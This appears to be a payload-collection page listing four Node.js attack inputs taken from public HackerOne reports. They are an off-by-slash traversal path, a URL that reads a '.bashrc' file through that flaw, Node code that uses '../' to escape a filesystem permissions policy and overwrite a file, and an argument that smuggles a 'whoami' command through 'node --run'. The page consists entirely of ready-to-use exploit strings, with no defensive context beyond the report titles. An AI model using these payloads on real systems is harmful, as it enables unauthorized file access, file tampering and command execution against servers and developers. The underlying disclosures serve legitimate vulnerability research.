# Node.js

4 payloads.

### `5d292091`

```
/metrics../
```

— [Off-by-slash vulnerability in target.com and evil.com](https://hackerone.com/reports/1631350) · Node.js · [nagaro](https://hackerone.com/nagaro)

### `88dee26d`

```
https://target.com/metrics../.bashrc
```

— [Off-by-slash vulnerability in target.com and evil.com](https://hackerone.com/reports/1631350) · Node.js · [nagaro](https://hackerone.com/nagaro)

### `e0aa6d78`

```
const fs = module.require('fs')
fs.writeFileSync("/home/user/restricted/../secret.txt", "Target Overwritten!")
```

— [Filesystem experimental permissions policy does not handle path traversal cases.](https://hackerone.com/reports/1952978) · Node.js · [haxatron1](https://hackerone.com/haxatron1)

### `031373bf`

```
SAFE_ARG'; whoami > "$NODE_RUN_COMMAND_OUTPUT"; #
```

— [Node --run POSIX positional argument escaping allows shell command injection](https://hackerone.com/reports/3817602) · Node.js · [yottt](https://hackerone.com/yottt)
